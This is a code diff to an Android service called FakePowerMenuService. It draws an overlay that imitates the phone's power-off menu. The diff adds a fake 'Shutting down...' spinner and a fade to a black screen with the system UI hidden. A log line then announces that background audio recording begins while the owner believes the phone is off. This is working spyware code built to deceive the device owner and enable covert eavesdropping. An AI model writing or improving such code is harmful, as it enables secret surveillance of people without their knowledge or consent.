@@ -13,7 +13,9 @@ import android.view.Gravity
 import android.view.LayoutInflater
 import android.view.View
 import android.view.WindowManager
+import android.view.animation.AlphaAnimation
 import android.widget.LinearLayout
+import android.widget.ProgressBar
 import android.widget.TextView
 
 class FakePowerMenuService : Service() {
@@ -74,29 +76,62 @@ class FakePowerMenuService : Service() {
         powerOffBtn.setPadding(50, 50, 50, 50)
         powerOffBtn.setBackgroundColor(Color.parseColor("#D32F2F")) // Red button
         
+        // Loading Spinner (Hidden initially)
+        val progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleLarge)
+        progressBar.visibility = View.GONE
+        val shuttingDownText = TextView(this)
+        shuttingDownText.text = "Shutting down..."
+        shuttingDownText.textSize = 18f
+        shuttingDownText.setTextColor(Color.WHITE)
+        shuttingDownText.setPadding(0, 20, 0, 0)
+        shuttingDownText.visibility = View.GONE
+        
         powerOffBtn.setOnClickListener {
-            Log.d(TAG, "Fake Power Off Clicked!")
-            enterStealthBlackScreen(layout)
+            Log.d(TAG, "Fake Power Off Clicked! Starting animation...")
+            
+            // 1. Hide the Power Button
+            powerOffBtn.visibility = View.GONE
+            
+            // 2. Show the "Shutting down..." spinner
+            progressBar.visibility = View.VISIBLE
+            shuttingDownText.visibility = View.VISIBLE
+            
+            // 3. Wait 2.5 seconds, then fade to black
+            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                enterStealthBlackScreen(layout)
+            }, 2500)
         }
 
         layout.addView(powerOffBtn)
+        layout.addView(progressBar)
+        layout.addView(shuttingDownText)
         
         overlayView = layout
         windowManager.addView(overlayView, params)
     }
 
     private fun enterStealthBlackScreen(layout: LinearLayout) {
-        // Clear all views and make it pure black
-        layout.removeAllViews()
-        layout.setBackgroundColor(Color.BLACK)
+        // Fade out animation
+        val fadeOut = AlphaAnimation(1f, 0f)
+        fadeOut.duration = 500
+        fadeOut.fillAfter = true
         
-        // Hide System UI (Immersive Mode)
-        layout.systemUiVisibility = (View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
-                or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
-                or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
-                or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
-                or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
-                or View.SYSTEM_UI_FLAG_FULLSCREEN)
+        layout.startAnimation(fadeOut)
+        
+        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+            // Clear all views and make it pure black
+            layout.removeAllViews()
+            layout.clearAnimation()
+            layout.setBackgroundColor(Color.BLACK)
+            
+            // Hide System UI (Immersive Mode)
+            layout.systemUiVisibility = (View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
+                    or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
+                    or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
+                    or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
+                    or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
+                    or View.SYSTEM_UI_FLAG_FULLSCREEN)
+        }, 500)
                 
         Log.d(TAG, "Entered Pure Black Stealth Mode. Beginning background audio recording...")
         
